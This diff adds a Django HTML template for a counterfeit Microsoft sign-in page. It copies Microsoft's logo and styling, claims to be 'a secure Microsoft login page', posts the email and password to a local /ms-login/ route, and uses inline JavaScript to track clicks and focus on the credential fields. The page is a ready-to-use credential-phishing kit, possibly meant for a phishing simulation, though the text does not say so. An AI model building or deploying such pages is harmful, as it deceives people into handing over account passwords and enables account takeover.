@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" href="https://www.microsoft.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 44px 40px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            height: 40px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            background: white;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0,103,184,0.1);
+        }
+        .form-group input::placeholder {
+            color: #999;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #004d8c;
+        }
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .options-row label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #333;
+            font-weight: normal;
+            cursor: pointer;
+        }
+        .options-row input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .link {
+            color: #0067b8;
+            text-decoration: none;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #e5e5e5;
+        }
+        .footer-text {
+            font-size: 14px;
+            color: #666;
+        }
+        .footer-text .link {
+            font-weight: 600;
+        }
+        .small-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+        }
+        .message {
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        .message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .message.warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+        }
+        .message.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        .alert-banner {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 10px 15px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
+            </div>
+
+            {% if messages %}
+                {% for message in messages %}
+                <div class="message {{ message.tags }}">
+                    {{ message }}
+                </div>
+                {% endfor %}
+            {% endif %}
+
+            <div class="alert-banner">
+                🔐 This is a secure Microsoft login page
+            </div>
+
+            <h1>Sign in</h1>
+            <p class="subtitle">to continue to Microsoft account</p>
+
+            <form method="POST" action="/ms-login/" id="loginForm">
+                {% csrf_token %}
+                <div class="form-group">
+                    <label for="email">Email or phone</label>
+                    <input type="email" id="email" name="loginfmt" placeholder="Enter your email" required autofocus autocomplete="email">
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="passwd" placeholder="Enter your password" required autocomplete="current-password">
+                </div>
+
+                <div class="options-row">
+                    <label>
+                        <input type="checkbox" name="remember" checked>
+                        Keep me signed in
+                    </label>
+                    <a href="#" class="link">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="btn" id="signInBtn">Sign in</button>
+            </form>
+
+            <div class="divider">
+                <p class="footer-text">
+                    No account? <a href="#" class="link">Create one!</a>
+                </p>
+                <p class="small-text">
+                    By signing in, you agree to the Microsoft Terms of Service and Privacy Policy.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tracking JavaScript -->
+    <script>
+        // ========== SESSION TRACKER ==========
+        
+        function getSessionId() {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [name, value] = cookie.trim().split('=');
+                if (name === 'ms_session_id') return value;
+            }
+            return null;
+        }
+
+        function getCSRFToken() {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [name, value] = cookie.trim().split('=');
+                if (name === 'csrftoken') return value;
+            }
+            return '';
+        }
+
+        function sendClickEvent(eventType, data = {}) {
+            const sessionId = getSessionId();
+            if (!sessionId) return;
+            
+            const payload = {
+                session_id: sessionId,
+                event_type: eventType || 'click',
+                x: data.x || 0,
+                y: data.y || 0,
+                target: data.target || 'unknown'
+            };
+            
+            fetch('/api/collect-click/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRFToken': getCSRFToken()
+                },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Track all clicks
+        document.addEventListener('click', function(e) {
+            const target = e.target;
+            sendClickEvent('click', {
+                x: e.clientX,
+                y: e.clientY,
+                target: target.tagName.toLowerCase()
+            });
+        });
+
+        // Track form submission
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            const btn = document.getElementById('signInBtn');
+            btn.disabled = true;
+            btn.textContent = 'Signing in...';
+            sendClickEvent('form_submit');
+        });
+
+        // Track field interactions
+        document.getElementById('email').addEventListener('focus', function() {
+            sendClickEvent('email_focus');
+        });
+        
+        document.getElementById('password').addEventListener('focus', function() {
+            sendClickEvent('password_focus');
+        });
+
+        console.log('🔍 Microsoft Login Tracker initialized');
+        console.log('📊 Session ID:', getSessionId());
+    </script>
+</body>
+</html>
